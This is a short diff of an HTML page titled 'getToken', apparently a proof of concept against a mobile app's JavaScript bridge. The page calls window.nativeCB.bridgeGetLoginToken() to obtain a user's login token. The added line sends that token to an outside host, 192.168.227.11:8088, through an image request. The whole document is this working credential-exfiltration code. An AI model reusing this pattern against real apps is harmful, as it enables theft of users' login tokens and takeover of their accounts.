@@ -6,11 +6,11 @@
 	<title>getToken</title>
 		<script type="text/javascript">
 		function loginTokenCallback(token){
+			document.body.appendChild(document.createElement("img")).src="http://192.168.227.11:8088/huitong/"+token;
 			alert('token is' + token);
 		}
-		var test = window.nativeCB.bridgeGetLoginToken();
-		setTimeout(test,5000);
-		document.location.href="https://tourmet.hwht.cn";
+		window.nativeCB.bridgeGetLoginToken();
+
 		</script>
 
 </head>
